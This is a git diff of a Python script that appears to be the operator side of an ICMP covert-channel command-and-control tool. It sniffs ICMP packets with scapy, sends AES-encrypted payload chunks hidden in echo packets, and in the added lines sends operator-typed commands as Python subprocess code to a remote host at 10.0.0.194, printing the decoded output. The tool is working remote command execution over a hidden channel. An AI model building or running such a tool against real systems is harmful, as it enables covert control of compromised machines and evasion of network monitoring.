@@ -2,6 +2,7 @@ import logging
 import os
 import threading
 import time
+from time import sleep
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from prompt_toolkit import PromptSession, print_formatted_text, prompt
@@ -24,9 +25,10 @@ FINISH_CODE = 2
 DELIMITER = "\00"
 FILLER_STRING = "\01"
 
-target = "127.0.0.1"
+target = "10.0.0.194"
 
 # fil = f"src host {target} and icmp"
+
 fil = "icmp"
 full_chunks = {}
 icmp_seq = 1
@@ -37,22 +39,38 @@ with open("aes_key.bin", "rb") as key_file:
 
 def sniff_icmp():
     def handle_recv(packet):
+        try:
+            print(base64.b64decode(packet[Raw].load).decode())
+        except Exception:
+            pass
         # regular icmp reply
-        if packet[ICMP].type == 0:
-            print(packet)
-            return
+        # print(packet)
+        # return
+        # if packet[ICMP].type == 0:
+        #     return
 
-        packet_recv_data = packet[Raw].load.decode()
-        message_data, extra = packet_recv_data.split(DELIMITER, 1)
-        message_code = int(message_data[0])
-        if message_code == RESEND_MESSAGE_CODE:
-            chunk_id = int(message_data[1:])
-            print(f"Recieved resend packet for chunk {chunk_id}")
-            send_icmp(full_chunks[chunk_id])
-        else:
-            print_formatted_text("No code message recieved:", packet[Raw].load)
+        # print("packet recieved")
+        # try:
+        #     print(packet.show())
+        # except Exception:
+        #     pass
+        # return
+        # try:
+        #     packet_recv_data = packet[Raw].load.decode()
+        #     print(packet_recv_data)
+        #     message_data, extra = packet_recv_data.split(DELIMITER, 1)
+        #     message_code = int(message_data[0])
+        #     if message_code == RESEND_MESSAGE_CODE:
+        #         chunk_id = int(message_data[1:])
+        #         print(f"Recieved resend packet for chunk {chunk_id}")
+        #         send_icmp(full_chunks[chunk_id])
+        #     else:
+        #         print_formatted_text("No code message recieved:", packet[Raw].load)
+        # except Exception:
+        #     print("exception caused")
+        #     return
 
-    sniff(filter=fil, prn=handle_recv, iface="tailscale0")
+    sniff(filter=fil, prn=handle_recv, iface="wlp0s20f3")
 
 
 def get_payload_chunks() -> list[bytes]:
@@ -112,43 +130,44 @@ test = 0
 def handle_message():
     global test
     # WARN: get_payload_chunks must be called to initialize the full_chunks dict
-    payload_chunks = get_payload_chunks()
+    # payload_chunks = get_payload_chunks()
 
-    # send the amount of chunks to expect
-    chunks_amount_payload = f"{CONTROL_MESSAGE_CODE}{len(payload_chunks)}{DELIMITER}"
-    send_chunk_size_resp = send_icmp(
-        f"{chunks_amount_payload}{(MAX_MESSAGE_SIZE - len(chunks_amount_payload)) * FILLER_STRING}".encode()
-    )
+    # # send the amount of chunks to expect
+    # chunks_amount_payload = f"{CONTROL_MESSAGE_CODE}{len(payload_chunks)}{DELIMITER}"
+    # send_chunk_size_resp = send_icmp(
+    #     f"{chunks_amount_payload}{(MAX_MESSAGE_SIZE - len(chunks_amount_payload)) * FILLER_STRING}".encode()
+    # )
 
-    # send chunks
-    for chunk in payload_chunks:
-        if test == 0:
-            test += 1
-            continue
-        resp = send_icmp(chunk)
-        if resp is not None:
-            print(resp)
-        else:
-            print("packet lost")
+    # # send chunks
+    # for chunk in payload_chunks:
+    #     # if test == 0:
+    #     #     test += 1
+    #     #     continue
+    #     resp = send_icmp(chunk)
+    #     if resp is not None:
+    #         print(resp)
+    #     else:
+    #         print("packet lost")
 
-    time.sleep(2)
+    # time.sleep(2)
 
-    # send that it has finished sending all chunks
-    finish_payload = f"{FINISH_CODE}{DELIMITER}"
-    send_finish_resp = send_icmp(
-        f"{finish_payload}{(MAX_MESSAGE_SIZE - len(finish_payload)) * FILLER_STRING}".encode()
-    )
+    # # send that it has finished sending all chunks
+    # finish_payload = f"{FINISH_CODE}{DELIMITER}"
+    # send_finish_resp = send_icmp(
+    #     f"{finish_payload}{(MAX_MESSAGE_SIZE - len(finish_payload)) * FILLER_STRING}".encode()
+    # )
 
-    # while True:
-    #     data = session.prompt(">")
-    #     aesgcm = AESGCM(symkey)
-    #     nonce = os.urandom(12)
-    #     ciphertext = aesgcm.encrypt(nonce, data.encode(), associated_data=None)
-    #     complete_ciphertext = nonce + ciphertext
-    #     send_icmp(complete_ciphertext)
+    # another option, send cli commands through icmp
+
+    while True:
+        data = session.prompt(">")
+        cmd_string = f"000import subprocess;result = subprocess.run({data.split(' ')}, capture_output=True, text=True);print(result.stdout);"
+        send_icmp(cmd_string.encode())
 
 
-sniffing_thread = threading.Thread(target=sniff_icmp)
+sniffing_thread = threading.Thread(target=sniff_icmp, daemon=True)
 message_thread = threading.Thread(target=handle_message)
 sniffing_thread.start()
 message_thread.start()
+
+sniffing_thread.join()
